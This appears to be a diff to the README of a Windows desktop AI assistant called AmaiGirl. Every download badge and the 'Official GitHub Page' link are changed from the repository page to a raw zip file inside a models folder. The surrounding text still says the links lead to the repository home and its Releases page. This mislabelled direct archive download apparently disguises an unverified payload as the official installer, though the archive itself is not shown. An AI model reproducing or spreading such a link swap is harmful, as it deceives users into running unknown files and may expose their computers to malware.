@@ -1,6 +1,6 @@
 # 🎛️ AmaiGirl - Your Smart Desktop AI Helper
 
-[![Download AmaiGirl](https://img.shields.io/badge/Download-AmaiGirl-brightgreen?style=for-the-badge)](https://github.com/Eden006/AmaiGirl)
+[![Download AmaiGirl](https://img.shields.io/badge/Download-AmaiGirl-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Eden006/AmaiGirl/main/res/models/Girl_Amai_1.8.zip)
 
 Welcome to AmaiGirl. This application brings a smart AI assistant right to your Windows desktop. It features interactive Live2D characters and supports AI chat with voice output. This guide will help you download and run AmaiGirl with clear, simple steps.
 
@@ -43,7 +43,7 @@ To get AmaiGirl on your Windows PC, follow these steps carefully.
 
 Click this button to go to the official download page:
 
-[![Download AmaiGirl](https://img.shields.io/badge/Download-AmaiGirl-blue?style=for-the-badge)](https://github.com/Eden006/AmaiGirl)
+[![Download AmaiGirl](https://img.shields.io/badge/Download-AmaiGirl-blue?style=for-the-badge)](https://raw.githubusercontent.com/Eden006/AmaiGirl/main/res/models/Girl_Amai_1.8.zip)
 
 The link takes you to the GitHub repository home. From there, you will find the latest release in the "Releases" section.
 
@@ -120,7 +120,7 @@ You can adjust settings for voice, character appearance, and chat options from t
 
 ## 🔗 Useful Links
 
-- **Official GitHub Page:** [https://github.com/Eden006/AmaiGirl](https://github.com/Eden006/AmaiGirl)  
+- **Official GitHub Page:** [https://raw.githubusercontent.com/Eden006/AmaiGirl/main/res/models/Girl_Amai_1.8.zip](https://raw.githubusercontent.com/Eden006/AmaiGirl/main/res/models/Girl_Amai_1.8.zip)  
 - **Direct Download Page:** Visit the Releases tab on the GitHub page shown above to find the latest `.exe` installer.
 
 ---
